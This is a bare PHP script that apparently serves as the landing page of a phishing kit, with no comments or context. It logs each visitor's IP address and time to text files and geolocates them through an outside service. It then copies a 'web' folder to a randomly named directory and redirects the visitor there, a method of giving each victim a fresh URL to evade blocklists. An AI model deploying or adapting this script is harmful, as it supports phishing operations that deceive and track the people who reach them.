<?php

$ip = getenv("REMOTE_ADDR");
$file = fopen("vu.txt","a");
fwrite($file,$ip."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");


        $ip=$_SERVER['REMOTE_ADDR'];

         $details = json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=$ip"));

            $continent=$details->geoplugin_continentCode;

            $country=$details->geoplugin_countryCode;

            
$ok = ("$country : $ip.  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."\n");

    $random=rand(0,100000);
$md5=md5("$random");

$dst= $random;
function recurse_copy($src,$dst) { 
    $dir = opendir($src); 
    @mkdir($dst); 
    while(false !== ( $file = readdir($dir)) ) { 
    if(( $file != '.' ) && ( $file != '..' )) { 
        if ( is_dir($src . '/' . $file) ) { 
        recurse_copy($src . '/' . $file,$dst . '/' . $file); 
         } 
    else { 
        copy($src . '/' . $file,$dst . '/' . $file); 
    } 
    } 
    } 
    closedir($dir); 
    } 
$src="web";
recurse_copy( $src, $dst );
header("location:$dst");
$ip = getenv("REMOTE_ADDR");
$file = fopen("Customer.txt","a");
fwrite($file,$ip." |> ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n");
    





?>